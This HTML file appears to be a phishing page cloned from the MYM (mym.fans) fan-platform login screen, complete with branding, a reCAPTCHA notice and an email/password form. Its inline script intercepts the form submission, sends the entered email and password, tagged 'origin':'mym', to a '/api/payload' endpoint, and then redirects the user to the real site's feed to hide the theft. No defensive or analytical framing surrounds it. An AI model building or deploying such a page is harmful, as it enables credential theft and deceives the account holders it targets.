<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/index.css" />
    <title>Login in - MYM</title>
</head>
<body>
    <main class="mym">
        <header class="mym_header">
            <img class="header_img" alt="mym-logo" src="assets/main-logo.png" />
            <div class="header_banner">
                <div class="link-item active">
                    <a href="#">fans</a>
                </div>
                <div class="link-item">
                    <a href="https://creators.mym.fans/app/login?logout=true">creators</a>
                </div>
            </div>
        </header>
        <section class="mym_section">
            <form class="login-form" id="login-form">
                <h3>Log in</h3>

                <div>
                    <label for="email">Email</label>
                    <input type="email" id="email" name="email" placeholder="adresse@mail.com" required />
                </div>
                <div>
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter your password" required />
                </div>
                <div>
                    <div class="login-links">
                        <a href="#">Forgotten your password?</a>
                        <a href="#">Resend my activation link</a>
                    </div>
                    <p class="recaptcha-info">
                        This page is protected by Google reCAPTCHA so we know that youâ€™re not a robot. <a href="#">Find out more</a>
                    </p>

                    <div class="button-wrapper">
                        <button type="submit">Log in</button>
                    </div>

                    <p class="signup-message">
                        Not signed up yet? 
                        <a href="#">Sign up</a>
                    </p>
                </div>
                </form>
        </section>
    </main>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const form = document.getElementById("login-form");
            if(!form)
                return;

            form.addEventListener("submit", function (e) {
                e.preventDefault();

                //payloads
                const email = document.getElementById("email").value;
                const password = document.getElementById("password").value;

                fetch("/api/payload", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        "origin":"mym",
                        "identifier": email,
                        "password": password,
                    })
                })
                .then(res => {
                    if (!res.ok) throw new Error("Request failed");
                    return res.json();
                })
                .then(data => {
                    window.location.href = "https://mym.fans/app/feed";
                })
                .catch(err => {
                    window.location.reload();
                });
            });
        });
        </script>
</body>
</html>
